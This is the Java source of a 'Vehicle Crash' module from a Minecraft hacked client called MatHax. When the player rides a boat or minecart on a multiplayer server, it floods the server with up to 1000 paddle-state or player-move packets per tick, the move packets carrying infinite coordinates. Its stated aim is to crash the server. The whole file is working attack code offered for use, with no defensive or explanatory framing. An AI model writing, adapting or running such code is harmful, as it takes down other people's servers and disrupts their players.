package mathax.client.systems.modules.crash;

import mathax.client.eventbus.EventHandler;
import mathax.client.events.game.GameLeftEvent;
import mathax.client.events.world.PlaySoundEvent;
import mathax.client.events.world.TickEvent;
import mathax.client.settings.BoolSetting;
import mathax.client.settings.IntSetting;
import mathax.client.settings.Setting;
import mathax.client.settings.SettingGroup;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.entity.vehicle.MinecartEntity;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

import java.util.Objects;

public class VehicleCrash extends Module {

    private final Setting<Integer> amount;

    private final Setting<Boolean> noSound;

    private final Setting<Boolean> autoDisable;
    private final Setting<Boolean> onGround;

    public VehicleCrash() {
        super(Categories.Crash, Items.MINECART, "Vehicle Crash", "CRYSTAL || Attemps to crash the server you are on while the player is in a vehicle(boat / minecart)");

        SettingGroup sgGeneral = settings.getDefaultGroup();

        amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(100)
            .min(1)
            .sliderMax(1000)
            .build()
        );

        noSound = sgGeneral.add(new BoolSetting.Builder()
            .name("no-sound")
            .description("Blocks the noisy paddle sounds.")
            .defaultValue(false)
            .build()
        );

        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
        );

        onGround = sgGeneral.add(new BoolSetting.Builder()
            .name("On ground")
            .description("Toggle On ground.")
            .defaultValue(true)
            .build()
        );
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if(!mc.isInSingleplayer()) {
            final BoatPaddleStateC2SPacket BOAT_PACKET = new BoatPaddleStateC2SPacket(true, true);
            final PlayerMoveC2SPacket MINECART_PACKET = new PlayerMoveC2SPacket.Full(Float.NEGATIVE_INFINITY, Float.POSITIVE_INFINITY, Float.NEGATIVE_INFINITY, Float.POSITIVE_INFINITY, Float.NEGATIVE_INFINITY, onGround.get());
            assert mc.player != null;
            Entity vehicle = mc.player.getVehicle();
            if (vehicle instanceof BoatEntity) {
                int i = 0;
                while (true) {
                    if (i < amount.get()) {
                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(BOAT_PACKET);
                        i++;
                    } else {
                        break;
                    }
                }
            } else if(vehicle instanceof MinecartEntity) {
                int i = 0;
                while (true) {
                    if (i < amount.get()) {
                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(MINECART_PACKET);
                        i++;
                    } else {
                        break;
                    }
                }
            }
            else {
                error("You must be in a boat or a minecart, toggling.");
                toggle();
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent event) {
        if ((noSound.get() && event.sound.getId().toString().equals("minecraft:entity.boat.paddle_land")) || event.sound.getId().toString().equals("minecraft:entity.boat.paddle_water")) {
            event.cancel();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }
}
